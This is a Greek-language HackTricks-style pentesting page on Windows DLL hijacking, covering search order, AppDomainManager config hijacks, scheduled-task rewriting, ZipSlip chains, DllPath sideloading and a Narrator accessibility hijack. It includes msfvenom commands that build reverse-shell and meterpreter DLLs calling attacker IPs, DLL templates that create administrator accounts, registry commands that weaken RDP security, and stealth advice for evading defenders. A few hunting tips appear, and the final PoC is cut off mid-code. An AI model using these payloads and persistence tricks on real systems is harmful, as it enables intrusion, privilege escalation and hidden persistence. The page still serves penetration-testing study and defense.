# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basic Information

Το DLL Hijacking περιλαμβάνει τον χειρισμό μιας trusted εφαρμογής ώστε να φορτώσει ένα malicious DLL. Ο όρος αυτός καλύπτει διάφορες τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για code execution, επίτευξη persistence, και, λιγότερο συχνά, privilege escalation. Παρά την εστίαση εδώ στο escalation, η μέθοδος hijacking παραμένει ίδια σε όλους τους στόχους.

### Common Techniques

Χρησιμοποιούνται αρκετές μέθοδοι για DLL hijacking, καθεμία με την αποτελεσματικότητά της να εξαρτάται από τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα malicious, προαιρετικά με χρήση DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του malicious DLL σε ένα search path πριν από το νόμιμο, εκμεταλλευόμενοι το search pattern της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός malicious DLL για να το φορτώσει μια εφαρμογή, νομίζοντας ότι είναι ένα ανύπαρκτο required DLL.
4. **DLL Redirection**: Τροποποίηση search parameters όπως `%PATH%` ή αρχείων `.exe.manifest` / `.exe.local` για να κατευθυνθεί η εφαρμογή στο malicious DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα malicious αντίγραφο στον κατάλογο WinSxS, μέθοδος που συχνά συνδέεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του malicious DLL σε έναν user-controlled κατάλογο μαζί με το αντιγραμμένο application, παρόμοιο με τεχνικές Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να γίνει ένα trusted **.NET Framework** process να φορτώσει attacker code. Αν το target executable είναι μια **managed** εφαρμογή, το CLR επίσης ελέγχει ένα **application configuration file** με όνομα ίδιο με το executable (για παράδειγμα `Setup.exe.config`). Αυτό το αρχείο μπορεί να ορίσει ένα custom **AppDomainManager**. Αν το config δείχνει σε ένα attacker-controlled assembly τοποθετημένο δίπλα στο EXE, το CLR το φορτώνει **πριν από το normal code path της εφαρμογής** και εκτελείται μέσα στο trusted process.

Σύμφωνα με το configuration schema του Microsoft .NET Framework, τόσο το `<appDomainManagerAssembly>` όσο και το `<appDomainManagerType>` πρέπει να υπάρχουν για να χρησιμοποιηθεί ο custom manager.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Ελάχιστος manager:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Σημειώσεις πρακτικής:
- Αυτό είναι tradecraft ειδικό για **.NET Framework**. Εξαρτάται από το parsing του CLR config, όχι από τη σειρά αναζήτησης DLL των Win32.
- Το host πρέπει να είναι πραγματικά ένα **managed EXE**. Γρήγορος έλεγχος: `sigcheck -m target.exe`, `corflags target.exe`, ή έλεγχος για το **CLR Runtime Header** στα PE metadata.
- Το όνομα του config πρέπει να ταιριάζει ακριβώς με το όνομα του executable (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **signed Microsoft/vendor binaries** επειδή το trusted EXE παραμένει ανέπαφο ενώ το malicious managed assembly εκτελείται in-process.
- Αν ήδη έχεις ένα writable installer/update directory, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως **πρώτο στάδιο**, ακολουθούμενο από classic DLL sideloading ή reflective loading για τα επόμενα στάδια.

### Hijacking an existing scheduled task to relaunch the sideload chain

Για persistence, μην κοιτάς μόνο για **creating a new task**. Κάποια intrusion sets περιμένουν μέχρι ένα legitimate installer να δημιουργήσει ένα **normal updater task** και μετά να **rewrite the task action** ώστε το υπάρχον name, author και trigger να παραμένουν οικεία στους defenders.

Reusable workflow:
1. Εγκατέστησε/εκτέλεσε το legitimate software και εντόπισε το task που δημιουργεί κανονικά.
2. Εξήγαγε το task XML και σημείωσε τις τρέχουσες τιμές `<Exec><Command>` / `<Arguments>`.
3. Αντικατάστησε μόνο το action ώστε το task να ξεκινά το **trusted host EXE** σου από ένα user-writable staging directory, το οποίο στη συνέχεια κάνει side-load ή AppDomain-load το πραγματικό payload.
4. Κάνε re-register το ίδιο task name αντί να δημιουργήσεις ένα νέο, προφανές persistence artifact.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Γιατί είναι πιο stealthy:
- Το όνομα του task μπορεί ακόμα να φαίνεται νόμιμο (για παράδειγμα, ένας vendor updater).
- Η **Task Scheduler service** το εκκινεί, οπότε η επικύρωση parent/ancestor συχνά βλέπει την αναμενόμενη αλυσίδα scheduling αντί για `explorer.exe`.
- Οι ομάδες DFIR που κυνηγούν μόνο **new task names** μπορεί να χάσουν ένα task του οποίου η registration υπήρχε ήδη, αλλά το action τώρα δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%`, ή σε άλλο attacker-controlled path.

Γρήγορα hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Σύγκρινε τα `C:\Windows\System32\Tasks\*` XML και `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata με ένα baseline.
- Κάνε alert όταν ένα **vendor-looking updater task** εκτελείται από **user-writable directories** ή εκκινεί ένα .NET EXE με ένα τοπικό `*.config` file.

> [!TIP]
> Για ένα step-by-step chain που συνδυάζει HTML staging, AES-CTR configs, και .NET implants πάνω σε DLL sideloading, δες το workflow παρακάτω.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Ο πιο συνηθισμένος τρόπος για να βρεις missing Dlls μέσα σε ένα system είναι να τρέξεις το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ρυθμίζοντας** τα **παρακάτω 2 filters**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

και να δείχνεις μόνο τη **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

Αν ψάχνεις για **missing dlls γενικά** άφησέ το να τρέξει για μερικά **seconds**.\
Αν ψάχνεις για ένα **missing dll μέσα σε συγκεκριμένο executable** πρέπει να βάλεις **άλλο filter όπως "Process Name" "contains" `<exec name>`, να το εκτελέσεις, και να σταματήσεις το capturing events**.

## Exploiting Missing Dlls

Για να κάνουμε privilege escalation, η καλύτερη ευκαιρία που έχουμε είναι να μπορούμε να **γράψουμε ένα dll που ένα privilege process θα προσπαθήσει να φορτώσει** σε κάποιο από τα **σημεία όπου θα αναζητηθεί**. Άρα, θα μπορούμε να **γράψουμε** ένα dll σε έναν **folder** όπου το **dll αναζητείται πριν** από τον folder όπου βρίσκεται το **original dll** (weird case), ή θα μπορούμε να **γράψουμε σε κάποιο folder όπου θα αναζητηθεί το dll** και το original **dll δεν υπάρχει** σε κανέναν folder.

### Dll Search Order

**Μέσα στη** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείς να βρεις πώς φορτώνονται συγκεκριμένα τα Dlls.**

Οι **Windows applications** ψάχνουν για DLLs ακολουθώντας ένα σύνολο από **pre-defined search paths**, τηρώντας μια συγκεκριμένη σειρά. Το ζήτημα του DLL hijacking προκύπτει όταν ένα harmful DLL τοποθετηθεί στρατηγικά σε έναν από αυτούς τους directories, εξασφαλίζοντας ότι θα φορτωθεί πριν από το authentic DLL. Ένας τρόπος για να το αποτρέψεις αυτό είναι να βεβαιωθείς ότι η εφαρμογή χρησιμοποιεί absolute paths όταν αναφέρεται στα DLLs που χρειάζεται.

Μπορείς να δεις το **DLL search order σε 32-bit** systems παρακάτω:

1. Ο directory από τον οποίο φορτώθηκε η εφαρμογή.
2. Ο system directory. Χρησιμοποίησε τη function [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να πάρεις το path αυτού του directory.(_C:\Windows\System32_)
3. Ο 16-bit system directory. Δεν υπάρχει function που να παίρνει το path αυτού του directory, αλλά γίνεται search. (_C:\Windows\System_)
4. Ο Windows directory. Χρησιμοποίησε τη function [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να πάρεις το path αυτού του directory.
1. (_C:\Windows_)
5. Ο current directory.
6. Οι directories που περιλαμβάνονται στη PATH environment variable. Πρόσεξε ότι αυτό δεν περιλαμβάνει το per-application path που καθορίζεται από το **App Paths** registry key. Το **App Paths** key δεν χρησιμοποιείται όταν υπολογίζεται το DLL search path.

Αυτή είναι η **default** σειρά αναζήτησης με ενεργό το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο current directory ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσεις αυτό το feature, δημιούργησε το registry value **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και όρισέ το σε 0 (default είναι enabled).

Αν η function [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH** η αναζήτηση ξεκινά στον directory του executable module που το **LoadLibraryEx** φορτώνει.

Τέλος, σημείωσε ότι **ένα dll μπορεί να φορτωθεί δηλώνοντας το absolute path αντί απλώς το name**. Σε αυτήν την περίπτωση το dll αυτό θα **αναζητηθεί μόνο σε εκείνο το path** (αν το dll έχει εξαρτήσεις, αυτές θα αναζητηθούν όπως όταν φορτώνονται by name).

Υπάρχουν και άλλοι τρόποι να αλλάξει η σειρά αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Χρησιμοποίησε **ProcMon** filters (`Process Name` = target EXE, `Path` τελειώνει σε `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξεις DLL names που το process δοκιμάζει αλλά δεν βρίσκει.
2. Αν το binary εκτελείται σε ένα **schedule/service**, το να ρίξεις ένα DLL με ένα από αυτά τα ονόματα στον **application directory** (search-order entry #1) θα το φορτώσει στο επόμενο execution. Σε ένα .NET scanner case το process έψαχνε για `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το πραγματικό copy από `C:\Program Files\dotnet\fxr\...`.
3. Φτιάξε ένα payload DLL (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν το primitive σου είναι ένα **ZipSlip-style arbitrary write**, φτιάξε ένα ZIP του οποίου το entry βγαίνει έξω από το extraction dir ώστε το DLL να καταλήξει στο app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Παράδωσε το archive στο watched inbox/share· όταν το scheduled task επανεκκινήσει το process, θα φορτώσει το malicious DLL και θα εκτελέσει τον κώδικά σου ως το service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προχωρημένος τρόπος για να επηρεάσεις με ντετερμινιστικό τρόπο το DLL search path ενός newly created process είναι να ορίσεις το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS όταν δημιουργείς το process με τα native APIs του ntdll. Παρέχοντας εδώ ένα directory που ελέγχει ο attacker, ένα target process που επιλύει ένα imported DLL by name (χωρίς absolute path και χωρίς τη χρήση των safe loading flags) μπορεί να αναγκαστεί να φορτώσει ένα malicious DLL από αυτό το directory.

Key idea
- Φτιάξε τα process parameters με το RtlCreateProcessParametersEx και δώσε ένα custom DllPath που δείχνει στον ελεγχόμενο φάκελό σου (π.χ. το directory όπου βρίσκεται το dropper/unpacker σου).
- Δημιούργησε το process με το RtlCreateUserProcess. Όταν το target binary επιλύει ένα DLL by name, το loader θα ελέγξει αυτό το supplied DllPath κατά την επίλυση, επιτρέποντας reliable sideloading ακόμη και όταν το malicious DLL δεν βρίσκεται στο ίδιο directory με το target EXE.

Notes/limitations
- Αυτό επηρεάζει το child process που δημιουργείται· είναι διαφορετικό από το SetDllDirectory, το οποίο επηρεάζει μόνο το current process.
- Το target πρέπει να κάνει import ή LoadLibrary ένα DLL by name (χωρίς absolute path και χωρίς να χρησιμοποιεί LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και τα hardcoded absolute paths δεν μπορούν να hijacked. Τα forwarded exports και το SxS μπορεί να αλλάξουν την precedence.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Παράδειγμα operational usage
- Τοποθέτησε ένα malicious xmllite.dll (exporting τις απαιτούμενες functions ή proxying στο real one) στον κατάλογο DllPath σου.
- Εκκίνησε ένα signed binary γνωστό ότι αναζητά xmllite.dll by name χρησιμοποιώντας την παραπάνω technique. Το loader επιλύει το import μέσω του παρεχόμενου DllPath και sideloads το DLL σου.

Αυτή η technique έχει παρατηρηθεί in-the-wild να οδηγεί σε multi-stage sideloading chains: ένας initial launcher ρίχνει ένα helper DLL, το οποίο στη συνέχεια κάνει spawn ένα Microsoft-signed, hijackable binary με custom DllPath ώστε να αναγκάσει τη φόρτωση του attacker’s DLL από ένα staging directory.


#### Exceptions on dll search order from Windows docs

Ορισμένες exceptions στο standard DLL search order αναφέρονται στην τεκμηρίωση των Windows:

- Όταν συναντάται ένα **DLL που μοιράζεται το όνομά του με ένα ήδη φορτωμένο στη μνήμη**, το σύστημα παρακάμπτει τη συνήθη αναζήτηση. Αντί γι' αυτό, εκτελεί έναν έλεγχο για redirection και ένα manifest πριν καταλήξει στο DLL που ήδη βρίσκεται στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για το DLL**.
- Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει τη δική του έκδοση του known DLL, μαζί με οποιαδήποτε dependent DLLs, **παραλείποντας τη διαδικασία αναζήτησης**. Το registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα από αυτά τα known DLLs.
- Αν ένα **DLL έχει dependencies**, η αναζήτηση για αυτά τα dependent DLLs γίνεται σαν να είχαν αναφερθεί μόνο με τα **module names** τους, ανεξάρτητα από το αν το αρχικό DLL εντοπίστηκε μέσω πλήρους path.

### Escalating Privileges

**Requirements**:

- Εντόπισε ένα process που λειτουργεί ή θα λειτουργήσει με **διαφορετικά privileges** (horizontal or lateral movement), το οποίο **δεν έχει ένα DLL**.
- Βεβαιώσου ότι υπάρχει **write access** για οποιονδήποτε **κατάλογο** στον οποίο θα γίνει **αναζήτηση του DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του executable ή ένας κατάλογος μέσα στο system path.

Ναι, οι προϋποθέσεις είναι δύσκολο να βρεθούν, καθώς **by default είναι κάπως περίεργο να βρεις ένα privileged executable να του λείπει ένα dll** και είναι ακόμα **πιο περίεργο να έχεις write permissions σε έναν system path φάκελο** (δεν μπορείς by default). Αλλά, σε misconfigured environments αυτό είναι δυνατό.\
Στην περίπτωση που είσαι τυχερός και διαπιστώσεις ότι πληροίς τις προϋποθέσεις, μπορείς να ελέγξεις το project [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν ο **main goal του project είναι bypass UAC**, μπορεί να βρεις εκεί ένα **PoC** ενός Dll hijaking για την έκδοση των Windows που μπορείς να χρησιμοποιήσεις (πιθανότατα αλλάζοντας απλώς το path του φακέλου όπου έχεις write permissions).

Σημείωσε ότι μπορείς να **ελέγξεις τα permissions σου σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα permissions όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείς επίσης να ελέγξεις τα imports ενός executable και τα exports ενός dll με:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό σχετικά με το πώς να **abuse Dll Hijacking to escalate privileges** με δικαιώματα εγγραφής σε έναν **System Path folder** δες:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

Το [**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχεις δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα automated tools για να ανακαλύψεις αυτήν την ευπάθεια είναι οι **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Example

Σε περίπτωση που βρεις ένα exploitable scenario, ένα από τα πιο σημαντικά πράγματα για να το exploitάρεις επιτυχώς θα ήταν να **create a dll that exports at least all the functions the executable will import from it**. Σε κάθε περίπτωση, σημείωσε ότι το Dll Hijacking είναι χρήσιμο για να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείς να βρεις ένα παράδειγμα του **how to create a valid dll** μέσα σε αυτή τη μελέτη για dll hijacking που επικεντρώνεται στο dll hijacking για execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **next sectio**n μπορείς να βρεις μερικά **basic dll codes** που ίσως είναι χρήσιμα ως **templates** ή για να δημιουργήσεις ένα **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Βασικά ένα **Dll proxy** είναι ένα Dll ικανό να **execute your malicious code when loaded** αλλά και να **expose** και να **work** όπως αναμένεται, **relaying all the calls to the real library**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείς στην πράξη να **indicate an executable and select the library** που θέλεις να proxify και να **generate a proxified dll** ή να **indicate the Dll** και να **generate a proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Λάβε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιούργησε έναν χρήστη (x86 δεν είδα έκδοση x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Δικό σου

Σημείωσε ότι σε αρκετές περιπτώσεις το Dll που θα κάνεις compile πρέπει να **export several functions** που θα φορτωθούν από το victim process, αν αυτές οι functions δεν υπάρχουν το **binary won't be able to load** them και το **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Παράδειγμα C++ DLL με δημιουργία χρήστη</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Εναλλακτικό C DLL με thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Μελέτη Περίπτωσης: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Το Windows Narrator.exe εξακολουθεί να ελέγχει κατά την εκκίνηση ένα προβλέψιμο, γλωσσικά ειδικό localization DLL που μπορεί να hijacked για arbitrary code execution και persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Αν υπάρχει writable attacker-controlled DLL στο OneCore path, φορτώνεται και εκτελείται το `DllMain(DLL_PROCESS_ATTACH)`. Δεν απαιτούνται exports.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Εκκινήστε το Narrator και παρατηρήστε την απόπειρα φόρτωσης του παραπάνω path.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC σιωπή
- Ένα naive hijack θα μιλήσει/τονίσει το UI. Για να μείνεις αθόρυβος, κατά το attach κάνε enumerate τα Narrator threads, άνοιξε το main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) και κάνε `SuspendThread` σε αυτό· συνέχισε στο δικό σου thread. Δες το PoC για πλήρη code.

Trigger και persistence μέσω Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Με τα παραπάνω, η εκκίνηση του Narrator φορτώνει το planted DLL. Στο secure desktop (logon screen), πάτησε CTRL+WIN+ENTER για να ξεκινήσει ο Narrator; το DLL σου εκτελείται ως SYSTEM στο secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Επέτρεψε classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Κάνε RDP στον host, στην logon screen πάτησε CTRL+WIN+ENTER για να εκκινήσεις τον Narrator; το DLL σου εκτελείται ως SYSTEM στο secure desktop.
- Η εκτέλεση σταματά όταν κλείσει το RDP session—κάνε inject/migrate άμεσα.

Bring Your Own Accessibility (BYOA)
- Μπορείς να κλωνοποιήσεις μια built-in Accessibility Tool (AT) registry entry (π.χ. CursorIndicator), να την επεξεργαστείς ώστε να δείχνει σε ένα arbitrary binary/DLL, να την importάρεις και μετά να ορίσεις το `configuration` σε εκείνο το AT name. Αυτό κάνει proxy arbitrary execution μέσα από το Accessibility framework.

Σημειώσεις
- Η εγγραφή στο `%windir%\System32` και η αλλαγή HKLM values απαιτούν admin rights.
- Όλη η payload logic μπορεί να βρίσκεται στο `DLL_PROCESS_ATTACH`; δεν χρειάζονται exports.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Αυτό το case δείχνει **Phantom DLL Hijacking** στο TrackPoint Quick Menu της Lenovo (`TPQMAssistant.exe`), που παρακολουθείται ως **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` που βρίσκεται στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` τρέχει καθημερινά στις 9:30 AM υπό το context του logged-on user.
- **Directory Permissions**: Writable από `CREATOR OWNER`, επιτρέποντας σε local users να drop arbitrary files.
- **DLL Search Behavior**: Προσπαθεί να φορτώσει το `hostfxr.dll` από το working directory του πρώτα και καταγράφει "NAME NOT FOUND" αν λείπει, κάτι που δείχνει προτεραιότητα στο local directory search.

### Exploit Implementation

Ένας attacker μπορεί να τοποθετήσει ένα malicious `hostfxr.dll` stub στον ίδιο φάκελο, εκμεταλλευόμενος το missing DLL για να πετύχει code execution υπό το context του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
